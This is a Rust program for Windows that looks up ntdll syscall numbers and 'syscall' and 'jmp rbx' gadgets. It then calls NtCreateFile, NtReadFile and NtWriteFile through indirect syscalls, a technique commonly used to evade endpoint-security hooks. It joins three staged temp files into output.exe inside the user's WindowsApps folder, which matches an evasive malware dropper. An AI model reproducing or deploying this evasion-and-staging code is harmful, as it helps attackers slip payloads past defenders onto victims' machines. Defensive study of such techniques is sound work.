#![allow(non_snake_case)]
#![allow(non_camel_case_types)]
#![allow(non_upper_case_globals)]

#[cfg(not(target_arch = "x86_64"))]
compile_error!("This project only supports x86_64 architecture.");

mod syscalls;

use std::ptr::null_mut;
use windows_sys::Win32::Foundation::{HANDLE, NTSTATUS, UNICODE_STRING, GENERIC_READ, GENERIC_WRITE};
use windows_sys::Win32::Storage::FileSystem::{FILE_SHARE_READ, SYNCHRONIZE, FILE_ATTRIBUTE_NORMAL};
use windows_sys::Win32::Security::SECURITY_DESCRIPTOR;

#[repr(C)]
pub struct OBJECT_ATTRIBUTES {
    pub Length: u32,
    pub RootDirectory: HANDLE,
    pub ObjectName: *const UNICODE_STRING,
    pub Attributes: u32,
    pub SecurityDescriptor: *const SECURITY_DESCRIPTOR,
    pub SecurityQualityOfService: *const core::ffi::c_void,
}

#[repr(C)]
pub struct IO_STATUS_BLOCK {
    pub Status: NTSTATUS,
    pub Information: usize,
}

const OBJ_CASE_INSENSITIVE: u32 = 0x00000040;

const FILE_OPEN: u32 = 0x00000001;
const FILE_OVERWRITE_IF: u32 = 0x00000005;

const FILE_NON_DIRECTORY_FILE: u32 = 0x00000040;
const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x00000020;

fn to_nt_path(path: &str) -> Vec<u16> {
    let mut nt_path = "\\??\\".encode_utf16().collect::<Vec<u16>>();
    nt_path.extend(path.encode_utf16());
    nt_path.push(0);
    nt_path
}

fn create_unicode_string(buffer: &[u16]) -> UNICODE_STRING {
    let len = if buffer.is_empty() { 0 } else { (buffer.len() - 1) * 2 };
    UNICODE_STRING {
        Length: len as u16,
        MaximumLength: (len + 2) as u16,
        Buffer: buffer.as_ptr() as *mut u16,
    }
}

fn main() {
    unsafe {
        let ntdll_base = syscalls::get_ntdll_base();
        if ntdll_base.is_null() {
            eprintln!("[-] Failed to get ntdll base");
            return;
        }

        let nt_create_file_ssn = syscalls::get_ssn(ntdll_base as *const u8, "NtCreateFile").expect("Failed to get NtCreateFile SSN");
        let nt_read_file_ssn = syscalls::get_ssn(ntdll_base as *const u8, "NtReadFile").expect("Failed to get NtReadFile SSN");
        let nt_write_file_ssn = syscalls::get_ssn(ntdll_base as *const u8, "NtWriteFile").expect("Failed to get NtWriteFile SSN");
        let nt_close_ssn = syscalls::get_ssn(ntdll_base as *const u8, "NtClose").expect("Failed to get NtClose SSN");

        let syscall_gadget = syscalls::find_syscall_gadget(ntdll_base as *const u8).expect("Failed to find syscall gadget");
        let jmp_rbx_gadget = syscalls::find_jmp_rbx_gadget(ntdll_base as *const u8).expect("Failed to find jmp rbx gadget");

        let temp_dir = std::env::var("TEMP").unwrap_or_else(|_| "C:\\Windows\\Temp".to_string());
        let local_app_data = std::env::var("LOCALAPPDATA").unwrap_or_else(|_| "C:\\Users\\Default\\AppData\\Local".to_string());

        let target_dir = format!("{}\\Microsoft\\WindowsApps", local_app_data);
        let _ = std::fs::create_dir_all(&target_dir);

        let out_path_str = format!("{}\\output.exe", target_dir);
        let out_path_wide = to_nt_path(&out_path_str);
        let out_unicode = create_unicode_string(&out_path_wide);

        let mut out_handle: HANDLE = 0;
        let mut io_status = IO_STATUS_BLOCK { Status: 0, Information: 0 };
        let mut obj_attr = OBJECT_ATTRIBUTES {
            Length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
            RootDirectory: 0,
            ObjectName: &out_unicode,
            Attributes: OBJ_CASE_INSENSITIVE,
            SecurityDescriptor: null_mut(),
            SecurityQualityOfService: null_mut(),
        };

        let status = syscall!(
            nt_create_file_ssn,
            syscall_gadget,
            jmp_rbx_gadget,
            &mut out_handle as *mut _ as usize,
            (GENERIC_WRITE | SYNCHRONIZE) as usize,
            &mut obj_attr as *mut _ as usize,
            &mut io_status as *mut _ as usize,
            0,
            FILE_ATTRIBUTE_NORMAL as usize,
            0,
            FILE_OVERWRITE_IF as usize,
            (FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT) as usize,
            0,
            0
        );

        if status != 0 {
            eprintln!("[-] NtCreateFile (output) failed with status: 0x{:08X}", status);
            return;
        }
        println!("[+] Successfully created output file: {}", out_path_str);

        for i in 1..=3 {
            let in_path_str = format!("{}\\{}.tmp", temp_dir, i);
            let in_path_wide = to_nt_path(&in_path_str);
            let in_unicode = create_unicode_string(&in_path_wide);

            let mut in_handle: HANDLE = 0;
            let mut in_obj_attr = OBJECT_ATTRIBUTES {
                Length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
                RootDirectory: 0,
                ObjectName: &in_unicode,
                Attributes: OBJ_CASE_INSENSITIVE,
                SecurityDescriptor: null_mut(),
                SecurityQualityOfService: null_mut(),
            };

            let status = syscall!(
                nt_create_file_ssn,
                syscall_gadget,
                jmp_rbx_gadget,
                &mut in_handle as *mut _ as usize,
                (GENERIC_READ | SYNCHRONIZE) as usize,
                &mut in_obj_attr as *mut _ as usize,
                &mut io_status as *mut _ as usize,
                0,
                FILE_ATTRIBUTE_NORMAL as usize,
                FILE_SHARE_READ as usize,
                FILE_OPEN as usize,
                (FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT) as usize,
                0,
                0
            );

            if status == 0 {
                println!("[+] Merging {}...", in_path_str);
                let mut buffer = [0u8; 8192];
                loop {
                    let mut read_io_status = IO_STATUS_BLOCK { Status: 0, Information: 0 };
                    let status = syscall!(
                        nt_read_file_ssn,
                        syscall_gadget,
                        jmp_rbx_gadget,
                        in_handle as usize,
                        0,
                        0,
                        0,
                        &mut read_io_status as *mut _ as usize,
                        buffer.as_mut_ptr() as usize,
                        buffer.len() as usize,
                        0,
                        0
                    );

                    if status != 0 {
                        if status as u32 != 0xC0000011 { // STATUS_END_OF_FILE
                            eprintln!("[-] NtReadFile failed with status: 0x{:08X}", status);
                        }
                        break;
                    }

                    if read_io_status.Information == 0 {
                        break;
                    }

                    let mut write_io_status = IO_STATUS_BLOCK { Status: 0, Information: 0 };
                    let status = syscall!(
                        nt_write_file_ssn,
                        syscall_gadget,
                        jmp_rbx_gadget,
                        out_handle as usize,
                        0,
                        0,
                        0,
                        &mut write_io_status as *mut _ as usize,
                        buffer.as_ptr() as usize,
                        read_io_status.Information as usize,
                        0,
                        0
                    );

                    if status != 0 {
                        eprintln!("[-] NtWriteFile failed with status: 0x{:08X}", status);
                        break;
                    }
                }
                syscall!(nt_close_ssn, syscall_gadget, jmp_rbx_gadget, in_handle as usize);
            } else {
                eprintln!("[-] Failed to open {} for reading, status: 0x{:08X}", in_path_str, status);
            }
        }

        syscall!(nt_close_ssn, syscall_gadget, jmp_rbx_gadget, out_handle as usize);
        println!("[+] Done.");
    }
}
